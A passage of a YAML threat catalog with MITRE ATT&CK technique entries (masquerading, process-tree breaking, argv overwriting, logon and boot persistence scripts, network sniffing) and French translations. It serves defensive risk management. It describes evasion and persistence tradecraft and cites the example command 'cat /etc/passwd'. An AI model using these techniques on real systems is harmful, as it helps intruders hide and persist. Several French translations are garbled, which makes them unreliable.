          \ et les extensions, tels que les fichiers texte (\xAB .txt \xBB) et les\
          \ fichiers image (\xAB .jpg \xBB, \xAB .gif, etc.) peuvent g\xE9n\xE9ralement\
          \ \xEAtre consid\xE9r\xE9s comme inoffensifs.  Sur cette base, les adversaires\
          \ peuvent utiliser une extension de fichier pour dissimuler des logiciels\
          \ malveillants, comme nommer un code d\xE9rob\xE9 PHP avec un nom <code>de\
          \ fichier test.gif</code>. Un utilisateur peut ne pas savoir qu\u2019un\
          \ fichier est malveillant en raison de son apparence b\xE9nigne et de son\
          \ extension.\n\nLes fichiers polyglottes, qui sont des fichiers comportant\
          \ plusieurs types de fichiers diff\xE9rents et fonctionnant diff\xE9remment\
          \ selon l\u2019application qui les ex\xE9cutera, peuvent \xE9galement \xEA\
          tre utilis\xE9s pour dissimuler des logiciels malveillants et des capacit\xE9\
          s. (Citation : polygot_icedID)\nhttps://attack.mitre.org/techniques/T1036/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.009
    ref_id: T1036.009
    name: Break Process Trees
    description: "An adversary may attempt to evade process tree-based analysis by\
      \ modifying executed malware's parent process ID (PPID). If endpoint protection\
      \ software leverages the \u201Cparent-child\" relationship for detection, breaking\
      \ this relationship could result in the adversary\u2019s behavior not being\
      \ associated with previous process tree activity. On Unix-based systems breaking\
      \ this process tree is common practice for administrators to execute software\
      \ using scripts and programs.(Citation: 3OHA double-fork 2022) \n\nOn Linux\
      \ systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106)\
      \ calls to alter malware's process tree. For example, adversaries can execute\
      \ their payload without any arguments, call the `fork()` API call twice, then\
      \ have the parent process exit. This creates a grandchild process with no parent\
      \ process that is immediately adopted by the `init` system process (PID 1),\
      \ which successfully disconnects the execution of the adversary's payload from\
      \ its previous process tree.\n\nAnother example is using the \u201Cdaemon\u201D\
      \ syscall to detach from the current parent process and run in the background.(Citation:\
      \ Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)\nhttps://attack.mitre.org/techniques/T1036/009"
    translations:
      fr:
        name: "Arbres de proc\xE9d\xE9 de rupture"
        description: "Un adversaire peut tenter d\u2019\xE9chapper \xE0 l\u2019analyse\
          \ bas\xE9e sur un arbre de processus en modifiant l\u2019ID de processus\
          \ parent (PPID) du logiciel malveillant ex\xE9cut\xE9. Si un logiciel de\
          \ protection des points de terminaison exploite la relation \xAB parent-enfant\
          \ \xBB pour la d\xE9tection, la rupture de cette relation pourrait entra\xEE\
          ner que le comportement de l\u2019adversaire ne soit pas associ\xE9 \xE0\
          \ l\u2019activit\xE9 pr\xE9c\xE9dente de l\u2019arbre de processus. Sur\
          \ les syst\xE8mes bas\xE9s sur Unix, casser cet arbre de processus est une\
          \ pratique courante pour les administrateurs qui ex\xE9cutent des logiciels\
          \ \xE0 l\u2019aide de scripts et de programmes. (Citation : 3OHA double-fork\
          \ 2022) \n\nSur les syst\xE8mes Linux, les adversaires peuvent ex\xE9cuter\
          \ une s\xE9rie d\u2019appels [API native](https://attack.mitre.org/techniques/T1106)\
          \ pour modifier l\u2019arbre de processus du malware. Par exemple, les adversaires\
          \ peuvent ex\xE9cuter leur charge utile sans aucun argument, appeler deux\
          \ fois l\u2019appel API 'fork()', puis faire sortir le processus parent.\
          \ Cela cr\xE9e un processus petit-enfant sans processus parent, imm\xE9\
          diatement adopt\xE9 par le processus syst\xE8me \xAB init \xBB (PID 1),\
          \ ce qui d\xE9connecte avec succ\xE8s l\u2019ex\xE9cution de la charge utile\
          \ de l\u2019adversaire de son arbre de processus pr\xE9c\xE9dent.\n\nUn\
          \ autre exemple est d\u2019utiliser l\u2019appel syst\xE8me \xAB daemon\
          \ \xBB pour se d\xE9tacher du processus parent courant et l\u2019ex\xE9\
          cuter en arri\xE8re-plan. (Citation : Sandfly BPFDoor 2022)(Citation : Microsoft\
          \ XorDdos Linux Stealth 2022)\nhttps://attack.mitre.org/techniques/T1036/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.010
    ref_id: T1036.010
    name: Masquerade Account Name
    description: "Adversaries may match or approximate the names of legitimate accounts\
      \ to make newly created ones appear benign. This will typically occur during\
      \ [Create Account](https://attack.mitre.org/techniques/T1136), although accounts\
      \ may also be renamed at a later date. This may also coincide with [Account\
      \ Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first\
      \ deletes an account before re-creating one with the same name.(Citation: Huntress\
      \ MOVEit 2023)\n\nOften, adversaries will attempt to masquerade as service accounts,\
      \ such as those associated with legitimate software, data backups, or container\
      \ cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec\
      \ Kubernetes Attack 2023) They may also give accounts generic, trustworthy names,\
      \ such as \u201Cadmin\u201D, \u201Chelp\u201D, or \u201Croot.\u201D(Citation:\
      \ Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account\
      \ names off of those already existing in the system, as a follow-on behavior\
      \ to [Account Discovery](https://attack.mitre.org/techniques/T1087).  \n\nNote\
      \ that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1684/001),\
      \ which describes impersonating specific trusted individuals or organizations,\
      \ rather than user or service account names.\nhttps://attack.mitre.org/techniques/T1036/010"
    translations:
      fr:
        name: Nom du compte Masquerade
        description: "Les adversaires peuvent faire correspondre ou approcher les\
          \ noms de comptes l\xE9gitimes pour faire para\xEEtre les nouveaux cr\xE9\
          \xE9s inoffensifs. Cela se produit g\xE9n\xE9ralement lors de [Cr\xE9er\
          \ un compte](https://attack.mitre.org/techniques/T1136), bien que les comptes\
          \ puissent \xE9galement \xEAtre renomm\xE9s ult\xE9rieurement. Cela peut\
          \ \xE9galement co\xEFncider avec [Suppression d\u2019acc\xE8s au compte](https://attack.mitre.org/techniques/T1531)\
          \ si l\u2019acteur supprime d\u2019abord un compte avant de recr\xE9er un\
          \ compte portant le m\xEAme nom. (Citation : Huntress MOVEit 2023)\n\nSouvent,\
          \ les adversaires tentent de se faire passer pour des comptes de service,\
          \ comme ceux associ\xE9s \xE0 des logiciels l\xE9gitimes, des sauvegardes\
          \ de donn\xE9es ou \xE0 la gestion de clusters de conteneurs. (Citation\
          \ : Ransomware Elastic CUBA 2022)(Citation : Aquasec Kubernetes Attack 2023)\
          \ Ils peuvent aussi donner aux comptes des noms g\xE9n\xE9riques et fiables,\
          \ tels que \xAB admin \xBB, \xAB help \xBB ou \xAB root \xBB. (Citation\
          \ : Ransomware Invictus IR Cloud 2024) Parfois, les adversaires peuvent\
          \ mod\xE9liser les noms de comptes \xE0 partir de ceux d\xE9j\xE0 existants\
          \ dans le syst\xE8me, en cons\xE9quence de [D\xE9couverte de compte](https://attack.mitre.org/techniques/T1087).\
          \  \n\nNotez que cela diff\xE8re de [Impersonation](https://attack.mitre.org/techniques/T1684/001),\
          \ qui d\xE9crit l\u2019usurpation d\u2019identit\xE9 de personnes ou d\u2019\
          organisations de confiance sp\xE9cifiques, plut\xF4t que des noms de comptes\
          \ utilisateurs ou de service.\nhttps://attack.mitre.org/techniques/T1036/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.011
    ref_id: T1036.011
    name: Overwrite Process Arguments
    description: "Adversaries may modify a process's in-memory arguments to change\
      \ its name in order to appear as a legitimate or benign process. On Linux, the\
      \ operating system stores command-line arguments in the process\u2019s stack\
      \ and passes them to the `main()` function as the `argv` array. The first element,\
      \ `argv[0]`, typically contains the process name or path - by default, the command\
      \ used to actually start the process (e.g., `cat /etc/passwd`). By default,\
      \ the Linux `/proc` filesystem uses this value to represent the process name.\
      \ The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools\
      \ like `ps` use it to display process information. Since arguments are stored\
      \ in user-space memory at launch, this modification can be performed without\
      \ elevated privileges. \n\nDuring runtime, adversaries can erase the memory\
      \ used by all command-line arguments for a process, overwriting each argument\
      \ string with null bytes. This removes evidence of how the process was originally\
      \ launched. They can then write a spoofed string into the memory region previously\
      \ occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`.\
      \ The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed\
      \ by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos\
      \ Linux Stealth 2022)\nhttps://attack.mitre.org/techniques/T1036/011"
    translations:
      fr:
        name: "\xC9craser les arguments du processus"
        description: "Les adversaires peuvent modifier les arguments en m\xE9moire\
          \ d\u2019un processus pour en changer le nom afin d\u2019appara\xEEtre comme\
          \ un processus l\xE9gitime ou b\xE9nin. Sous Linux, le syst\xE8me d\u2019\
          exploitation stocke les arguments en ligne de commande dans la pile du processus\
          \ et les transmet \xE0 la fonction \xAB main() \xBB sous forme de tableau\
          \ \xAB argv \xBB. Le premier \xE9l\xE9ment, \xAB argv[0] \xBB, contient\
          \ g\xE9n\xE9ralement le nom ou le chemin du processus \u2013 par d\xE9faut,\
          \ la commande utilis\xE9e pour r\xE9ellement d\xE9marrer le processus (par\
          \ exemple, \xAB cat /etc/passwd \xBB). Par d\xE9faut, le syst\xE8me de fichiers\
          \ Linux '/proc' utilise cette valeur pour repr\xE9senter le nom du processus.\
          \ Le fichier '/proc/<PID>/cmdline' refl\xE8te le contenu de cette m\xE9\
          moire, et des outils comme 'ps' l\u2019utilisent pour afficher les informations\
          \ sur les processus. Puisque les arguments sont stock\xE9s dans la m\xE9\
          moire en espace utilisateur au lancement, cette modification peut \xEAtre\
          \ effectu\xE9e sans privil\xE8ges \xE9lev\xE9s. \n\nEn temps r\xE9el, les\
          \ adversaires peuvent effacer la m\xE9moire utilis\xE9e par tous les arguments\
          \ en ligne de commande d\u2019un processus, en \xE9crasant chaque cha\xEE\
          ne d\u2019arguments avec des octets nuls. Cela \xE9limine les preuves de\
          \ la mani\xE8re dont le processus a \xE9t\xE9 initialement lanc\xE9. Ils\
          \ peuvent alors \xE9crire une cha\xEEne usurp\xE9e dans la r\xE9gion m\xE9\
          moire pr\xE9c\xE9demment occup\xE9e par 'argv[0]' pour imiter une commande\
          \ b\xE9nigne, comme 'cat resolv.conf'. La nouvelle cha\xEEne de ligne de\
          \ commande est refl\xE9t\xE9e dans \xAB /proc/<PID>/cmdline \xBB et affich\xE9\
          e par des outils comme \xAB ps \xBB. Citation : Sandfly BPFDoor 2022) (Citation\
          \ : Microsoft XorDdos Linux Stealth 2022)\nhttps://attack.mitre.org/techniques/T1036/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.012
    ref_id: T1036.012
    name: Browser Fingerprint
    description: "Adversaries may attempt to blend in with legitimate traffic by spoofing\
      \ browser and system attributes like operating system, system language, platform,\
      \ user-agent string, resolution, time zone, etc.  The HTTP\_User-Agent\_request\
      \ header\_is a string that lets servers and network peers identify the application,\
      \ operating system, vendor, and/or version of the requesting\_user agent.(Citation:\
      \ Mozilla User Agent)\n\nAdversaries may gather this information through [System\
      \ Information Discovery](https://attack.mitre.org/techniques/T1082) or by users\
      \ navigating to adversary-controlled websites, and then use that information\
      \ to craft their web traffic to evade defenses.(Citation: Gummy Browsers Targeted\
      \ Browser Spoofing against State-of-the-Art Fingerprinting Techniques)\nhttps://attack.mitre.org/techniques/T1036/012"
    translations:
      fr:
        name: Empreinte digitale du navigateur
        description: "Les adversaires peuvent tenter de se fondre dans le trafic l\xE9\
          gitime en usurpant des attributs du navigateur et du syst\xE8me comme le\
          \ syst\xE8me d\u2019exploitation, le langage syst\xE8me, la plateforme,\
          \ la cha\xEEne utilisateur-agent, la r\xE9solution, le fuseau horaire, etc.\
          \  L\u2019en-t\xEAte de requ\xEAte HTTP User-Agent est une cha\xEEne qui\
          \ permet aux serveurs et aux pairs r\xE9seau d\u2019identifier l\u2019application,\
          \ le syst\xE8me d\u2019exploitation, le fournisseur et/ou la version de\
          \ l\u2019agent utilisateur demandeur. (Citation : Mozilla User Agent)\n\n\
          Les adversaires peuvent recueillir ces informations via la [D\xE9couverte\
          \ d\u2019Informations du Syst\xE8me](https://attack.mitre.org/techniques/T1082)\
          \ ou par des utilisateurs naviguant sur des sites web contr\xF4l\xE9s par\
          \ l\u2019adversaire, puis utiliser ces informations pour \xE9laborer leur\
          \ trafic web afin d\u2019\xE9chapper aux d\xE9fenses. (Citation : Les navigateurs\
          \ de gommes ciblaient la usurpation des navigateurs contre les techniques\
          \ d\u2019empreintes digitales de pointe)\nhttps://attack.mitre.org/techniques/T1036/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037
    ref_id: T1037
    name: Boot or Logon Initialization Scripts
    description: "Adversaries may use scripts automatically executed at boot or logon\
      \ initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy\
      \ Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can\
      \ be used to perform administrative functions, which may often execute other\
      \ programs or send information to an internal logging server. These scripts\
      \ can vary based on operating system and whether applied locally or remotely.\
      \  \n\nAdversaries may use these scripts to maintain persistence on a single\
      \ system. Depending on the access configuration of the logon scripts, either\
      \ local credentials or an administrator account may be necessary. \n\nAn adversary\
      \ may also be able to escalate their privileges since some boot or logon initialization\
      \ scripts run with higher privileges.\nhttps://attack.mitre.org/techniques/T1037"
    translations:
      fr:
        name: "Scripts d\u2019initialisation de d\xE9marrage ou de connexion"
        description: "Les adversaires peuvent utiliser des scripts ex\xE9cut\xE9s\
          \ automatiquement au d\xE9marrage ou \xE0 l\u2019initialisation de connexion\
          \ pour \xE9tablir la persistance. (Citation : Mandiant APT29 Eye Spy Email\
          \ 22 nov.)(Citation : Anomali Rocke mars 2019) Les scripts d\u2019initialisation\
          \ peuvent \xEAtre utilis\xE9s pour effectuer des fonctions administratives,\
          \ qui peuvent souvent ex\xE9cuter d\u2019autres programmes ou envoyer des\
          \ informations \xE0 un serveur de journalisation interne. Ces scripts peuvent\
          \ varier selon le syst\xE8me d\u2019exploitation et s\u2019ils sont appliqu\xE9\
          s localement ou \xE0 distance.  \n\nLes adversaires peuvent utiliser ces\
          \ scripts pour maintenir la persistance sur un seul syst\xE8me. Selon la\
          \ configuration d\u2019acc\xE8s des scripts de connexion, des identifiants\
          \ locaux ou un compte administrateur peuvent \xEAtre n\xE9cessaires. \n\n\
          Un adversaire peut \xE9galement \xEAtre capable d\u2019escalader ses privil\xE8\
          ges, car certains scripts d\u2019initialisation de d\xE9marrage ou de connexion\
          \ fonctionnent avec des privil\xE8ges plus \xE9lev\xE9s.\nhttps://attack.mitre.org/techniques/T1037"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.001
    ref_id: T1037.001
    name: Logon Script (Windows)
    description: 'Adversaries may use Windows logon scripts automatically executed
      at logon initialization to establish persistence. Windows allows logon scripts
      to be run whenever a specific user or group of users log into a system.(Citation:
      TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code>
      Registry key.(Citation: Hexacorn Logon Scripts)


      Adversaries may use these scripts to maintain persistence on a single system.
      Depending on the access configuration of the logon scripts, either local credentials
      or an administrator account may be necessary.

      https://attack.mitre.org/techniques/T1037/001'
    translations:
      fr:
        name: Script de connexion (Windows)
        description: "Les adversaires peuvent utiliser des scripts de connexion Windows\
          \ ex\xE9cut\xE9s automatiquement lors de l\u2019initialisation pour \xE9\
          tablir la persistance. Windows permet d\u2019ex\xE9cuter des scripts de\
          \ connexion chaque fois qu\u2019un utilisateur sp\xE9cifique ou un groupe\
          \ d\u2019utilisateurs se connecte \xE0 un syst\xE8me. (Citation : Scripts\
          \ de connexion TechNet) Cela se fait en ajoutant un chemin vers un script\
          \ vers la cl\xE9 <code>du registre HKCU\\Environment\\UserInitMprLogonScript</code>.\
          \ (Citation : \xC9critures de connexion Hexacorn)\n\nLes adversaires peuvent\
          \ utiliser ces scripts pour maintenir la persistance sur un seul syst\xE8\
          me. Selon la configuration d\u2019acc\xE8s des scripts de connexion, des\
          \ identifiants locaux ou un compte administrateur peuvent \xEAtre n\xE9\
          cessaires.\nhttps://attack.mitre.org/techniques/T1037/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.002
    ref_id: T1037.002
    name: Login Hook
    description: "Adversaries may use a Login Hook to establish persistence executed\
      \ upon user logon. A login hook is a plist file that points to a specific script\
      \ to execute with root privileges upon user logon. The plist file is located\
      \ in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file\
      \ and can be modified using the <code>defaults</code> command-line utility.\
      \ This behavior is the same for logout hooks where a script can be executed\
      \ upon user logout. All hooks require administrator permissions to modify or\
      \ create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts\
      \ Apple Dev) \n\nAdversaries can add or insert a path to a malicious script\
      \ in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code>\
      \ or <code>LogoutHook</code> key-value pair. The malicious script is executed\
      \ upon the next user login. If a login hook already exists, adversaries can\
      \ add additional commands to an existing login hook. There can be only one login\
      \ and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation:\
      \ Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11\
      \ version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001)\nhttps://attack.mitre.org/techniques/T1037/002"
    translations:
      fr:
        name: Crochet de connexion
        description: "Les adversaires peuvent utiliser un crochet de connexion pour\
          \ \xE9tablir la persistance ex\xE9cut\xE9e lors de la connexion utilisateur.\
          \ Un hook de connexion est un fichier plist qui pointe vers un script sp\xE9\
          cifique \xE0 ex\xE9cuter avec des privil\xE8ges racines lors de la connexion\
          \ utilisateur. Le fichier plist se trouve dans le fichier <code>/Library/Preferences/com.apple.loginwindow.plist</code>\
          \ et peut \xEAtre modifi\xE9 \xE0 l\u2019aide de l\u2019utilitaire <code>de\
          \ ligne de commande par d\xE9faut.</code> Ce comportement est le m\xEAme\
          \ pour les hooks de d\xE9connexion o\xF9 un script peut \xEAtre ex\xE9cut\xE9\
          \ lors de la d\xE9connexion de l\u2019utilisateur. Tous les crochets n\xE9\
          cessitent des autorisations administrateur pour modifier ou cr\xE9er des\
          \ crochets. (Citation : Script de connexion Apple Dev)(Citation : LoginWindowScripts\
          \ Apple Dev) \n\nLes adversaires peuvent ajouter ou ins\xE9rer un chemin\
          \ vers un script malveillant dans le fichier <code>com.apple.loginwindow.plist</code>,\
          \ en utilisant la paire <code>cl\xE9-valeur LoginHook</code> ou <code>LogoutHook</code>.\
          \ Le script malveillant est ex\xE9cut\xE9 lors de la prochaine connexion\
          \ utilisateur. Si un hook de connexion existe d\xE9j\xE0, les adversaires\
          \ peuvent ajouter des commandes suppl\xE9mentaires \xE0 un hook de connexion\
          \ existant. Il ne peut y avoir qu\u2019un seul crochet de connexion et de\
          \ d\xE9connexion sur un syst\xE8me \xE0 la fois. (Citation : Persistance\
          \ de la S1 macOs)(Citation : Chapitre de la pers\xE9v\xE9rance de Wardle)\n\
          \n**Note :** Les hooks de connexion ont \xE9t\xE9 d\xE9pr\xE9ci\xE9s dans\
          \ la version 10.11 de macOS au profit de [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
          \ et [Launch Agent](https://attack.mitre.org/techniques/T1543/001)\nhttps://attack.mitre.org/techniques/T1037/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.003
    ref_id: T1037.003
    name: Network Logon Script
    description: "Adversaries may use network logon scripts automatically executed\
      \ at logon initialization to establish persistence. Network logon scripts can\
      \ be assigned using Active Directory or Group Policy Objects.(Citation: Petri\
      \ Logon Script AD) These logon scripts run with the privileges of the user they\
      \ are assigned to. Depending on the systems within the network, initializing\
      \ one of these scripts could apply to more than one or potentially all systems.\
      \  \n \nAdversaries may use these scripts to maintain persistence on a network.\
      \ Depending on the access configuration of the logon scripts, either local credentials\
      \ or an administrator account may be necessary.\nhttps://attack.mitre.org/techniques/T1037/003"
    translations:
      fr:
        name: "Script de connexion r\xE9seau"
        description: "Les adversaires peuvent utiliser des scripts de connexion r\xE9\
          seau ex\xE9cut\xE9s automatiquement lors de l\u2019initialisation pour \xE9\
          tablir la persistance. Les scripts de connexion r\xE9seau peuvent \xEAtre\
          \ attribu\xE9s \xE0 l\u2019aide d\u2019Active Directory ou d\u2019objets\
          \ de politique de groupe. (Citation : \xC9criture de connexion Petri AD)\
          \ Ces scripts de connexion s\u2019ex\xE9cutent avec les privil\xE8ges de\
          \ l\u2019utilisateur auquel ils sont assign\xE9s. Selon les syst\xE8mes\
          \ du r\xE9seau, initialiser l\u2019un de ces scripts peut s\u2019appliquer\
          \ \xE0 plus d\u2019un, voire \xE0 tous.  \n \nLes adversaires peuvent utiliser\
          \ ces scripts pour maintenir la persistance sur un r\xE9seau. Selon la configuration\
          \ d\u2019acc\xE8s des scripts de connexion, des identifiants locaux ou un\
          \ compte administrateur peuvent \xEAtre n\xE9cessaires.\nhttps://attack.mitre.org/techniques/T1037/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.004
    ref_id: T1037.004
    name: RC Scripts
    description: "Adversaries may establish persistence by modifying RC scripts, which\
      \ are executed during a Unix-like system\u2019s startup. These files allow system\
      \ administrators to map and start custom services at startup for different run\
      \ levels. RC scripts require root privileges to modify.\n\nAdversaries may establish\
      \ persistence by adding a malicious binary path or shell commands to <code>rc.local</code>,\
      \ <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation:\
      \ IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon\
      \ reboot, the system executes the script's contents as root, resulting in persistence.\n\
      \nAdversary abuse of RC scripts is especially effective for lightweight Unix-like\
      \ distributions using the root user as default, such as ESXi hypervisors, IoT,\
      \ or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store\
      \ most system files in memory and therefore discard changes on shutdown, leveraging\
      \ `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence\
      \ across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)\n\nSeveral\
      \ Unix-like systems have moved to Systemd and deprecated the use of RC scripts.\
      \ This is now a deprecated mechanism in macOS in favor of Launchd.(Citation:\
      \ Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique\
      \ can be used on Mac OS X Panther v10.3 and earlier versions which still execute\
      \ the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain\
      \ backwards compatibility some systems, such as Ubuntu, will execute the RC\
      \ scripts if they exist with the correct file permissions.(Citation: Ubuntu\
      \ Manpage systemd rc)\nhttps://attack.mitre.org/techniques/T1037/004"
    translations:
      fr:
        name: RC Scripts
        description: "Les adversaires peuvent \xE9tablir leur persistance en modifiant\
          \ des scripts RC, qui sont ex\xE9cut\xE9s lors du d\xE9marrage d\u2019un\
          \ syst\xE8me de type Unix. Ces fichiers permettent aux administrateurs syst\xE8\
          me de mapper et de lancer des services personnalis\xE9s au d\xE9marrage\
          \ pour diff\xE9rents niveaux d\u2019ex\xE9cution. Les scripts RC n\xE9cessitent\
          \ des privil\xE8ges racines pour \xEAtre modifi\xE9s.\n\nLes adversaires\
          \ peuvent \xE9tablir la persistance en ajoutant un chemin binaire malveillant\
          \ ou des commandes shell \xE0 <code>rc.local</code>, <code>rc.common</code>\
          \ et d\u2019autres scripts RC sp\xE9cifiques \xE0 la distribution de type\
          \ Unix. (Citation : IranThreats Kittens d\xE9c. 2017)(Citation : Carte Intezer\
          \ HiddenWasp 2019) Au red\xE9marrage, le syst\xE8me ex\xE9cute le contenu\
          \ du script en tant que racine, ce qui entra\xEEne une persistance.\n\n\
          L\u2019abus adversaire des scripts RC est particuli\xE8rement efficace pour\
          \ les distributions l\xE9g\xE8res de type Unix utilisant l\u2019utilisateur\
          \ racine par d\xE9faut, telles que les hyperviseurs ESXi, l\u2019IoT ou\
          \ les syst\xE8mes embarqu\xE9s. (Citation : intezer-kaiji-malware) Comme\
          \ les serveurs ESXi stockent la plupart des fichiers syst\xE8me en m\xE9\
          moire et \xE9liminent donc les modifications lors de l\u2019arr\xEAt, l\u2019\
          utilisation de \xAB /etc/rc.local.d/local.sh \xBB est l\u2019un des rares\
          \ m\xE9canismes permettant la persistance entre les red\xE9marrages. (Citation\
          \ : Juniper Networks ESXi Backdoor 2022)\n\nPlusieurs syst\xE8mes de type\
          \ Unix sont pass\xE9s au Systemd et ont abandonn\xE9 l\u2019utilisation\
          \ des scripts RC. C\u2019est d\xE9sormais un m\xE9canisme obsol\xE8te dans\
          \ macOS au profit de Launchd. (Citation : Archive documentaire du d\xE9\
          veloppeur Apple lanc\xE9e)(Citation : \xC9l\xE9ments de d\xE9marrage) Cette\
          \ technique peut \xEAtre utilis\xE9e sur Mac OS X, Panther v10.3 et versions\
          \ ant\xE9rieures qui ex\xE9cutent encore les scripts RC. (Citation : M\xE9\
          thodes de persistance des malwares Mac) Pour maintenir la r\xE9trocompatibilit\xE9\
          , certains syst\xE8mes, comme Ubuntu, ex\xE9cutent les scripts RC s\u2019\
          ils existent avec les permissions de fichier correctes. (Citation : Ubuntu\
          \ Manpage systemd rc)\nhttps://attack.mitre.org/techniques/T1037/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.005
    ref_id: T1037.005
    name: Startup Items
    description: "Adversaries may use startup items automatically executed at boot\
      \ initialization to establish persistence. Startup items execute during the\
      \ final phase of the boot process and contain shell scripts or other executable\
      \ files along with configuration information used by the system to determine\
      \ the execution order for all startup items.(Citation: Startup Items)\n\nThis\
      \ is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)),\
      \ and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019\
      t guaranteed to exist on the system by default, but does appear to exist by\
      \ default on macOS Sierra. A startup item is a directory whose executable and\
      \ configuration property list (plist), <code>StartupParameters.plist</code>,\
      \ reside in the top-level directory. \n\nAn adversary can create the appropriate\
      \ folders/files in the StartupItems directory to register their own persistence\
      \ mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since\
      \ StartupItems run during the bootup phase of macOS, they will run as the elevated\
      \ root user.\nhttps://attack.mitre.org/techniques/T1037/005"
    translations:
      fr:
        name: "\xC9l\xE9ments de d\xE9marrage"
        description: "Les adversaires peuvent utiliser des \xE9l\xE9ments de d\xE9\
          marrage ex\xE9cut\xE9s automatiquement \xE0 l\u2019initialisation du d\xE9\
          marrage pour \xE9tablir la persistance. Les \xE9l\xE9ments de d\xE9marrage\
          \ s\u2019ex\xE9cutent lors de la phase finale du processus de d\xE9marrage\
          \ et contiennent des scripts shell ou d\u2019autres fichiers ex\xE9cutables\
          \ ainsi que des informations de configuration utilis\xE9es par le syst\xE8\
          me pour d\xE9terminer l\u2019ordre d\u2019ex\xE9cution de tous les \xE9\
          l\xE9ments de d\xE9marrage. (Citation : \xC9l\xE9ments de d\xE9marrage)\n\
          \nTechniquement, c\u2019est une technologie obsol\xE8te (supplant\xE9e par\
          \ [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), et donc\
          \ le dossier appropri\xE9, <code>/Library/StartupItems</code>, n\u2019est\
          \ pas garanti d\u2019exister sur le syst\xE8me par d\xE9faut, mais il semble\
          \ exister par d\xE9faut sur macOS Sierra. Un \xE9l\xE9ment de d\xE9marrage\
          \ est un r\xE9pertoire dont la liste ex\xE9cutable et la liste de propri\xE9\
          t\xE9s de configuration (plist), <code>StartupParameters.plist</code>, r\xE9\
          sident dans le r\xE9pertoire de premier niveau. \n\nUn adversaire peut cr\xE9\
          er les dossiers/fichiers appropri\xE9s dans le r\xE9pertoire StartupItems\
          \ pour enregistrer son propre m\xE9canisme de persistance. (Citation : M\xE9\
          thodes de persistance des malwares Mac) De plus, puisque les StartupItems\
          \ s\u2019ex\xE9cutent pendant la phase de d\xE9marrage de macOS, ils s\u2019\
          ex\xE9cutent en tant qu\u2019utilisateur root \xE9lev\xE9.\nhttps://attack.mitre.org/techniques/T1037/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1039
    ref_id: T1039
    name: Data from Network Shared Drive
    description: 'Adversaries may search network shares on computers they have compromised
      to find files of interest. Sensitive data can be collected from remote systems
      via shared network drives (host shared directory, network file server, etc.)
      that are accessible from the current system prior to Exfiltration. Interactive
      command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      may be used to gather information.

      https://attack.mitre.org/techniques/T1039'
    translations:
      fr:
        name: "Donn\xE9es provenant du lecteur partag\xE9 r\xE9seau"
        description: "Les adversaires peuvent rechercher des partages r\xE9seau sur\
          \ des ordinateurs qu\u2019ils ont compromis pour trouver des fichiers d\u2019\
          int\xE9r\xEAt. Les donn\xE9es sensibles peuvent \xEAtre collect\xE9es depuis\
          \ des syst\xE8mes distants via des disques r\xE9seau partag\xE9s (r\xE9\
          pertoire partag\xE9 h\xF4te, serveur de fichiers r\xE9seau, etc.) accessibles\
          \ depuis le syst\xE8me actuel avant l\u2019Exfiltration. Des shells de commande\
          \ interactifs peuvent \xEAtre utilis\xE9s, et des fonctionnalit\xE9s courantes\
          \ dans [cmd](https://attack.mitre.org/software/S0106) peuvent \xEAtre utilis\xE9\
          es pour recueillir des informations.\nhttps://attack.mitre.org/techniques/T1039"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1040
    ref_id: T1040
    name: Network Sniffing
    description: 'Adversaries may passively sniff network traffic to capture information
      about an environment, including authentication material passed over the network.
      Network sniffing refers to using the network interface on a system to monitor
      or capture information sent over a wired or wireless connection. An adversary
      may place a network interface into promiscuous mode to passively access data
      in transit over the network, or use span ports to capture a larger amount of
      data.


      Data captured via this technique may include user credentials, especially those
      sent over an insecure, unencrypted protocol. Techniques for name service resolution
      poisoning, such as [Name Resolution Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001),
      can also be used to capture credentials to websites, proxies, and internal systems
      by redirecting traffic to an adversary.


      Network sniffing may reveal configuration details, such as running services,
      version numbers, and other network characteristics (e.g. IP addresses, hostnames,
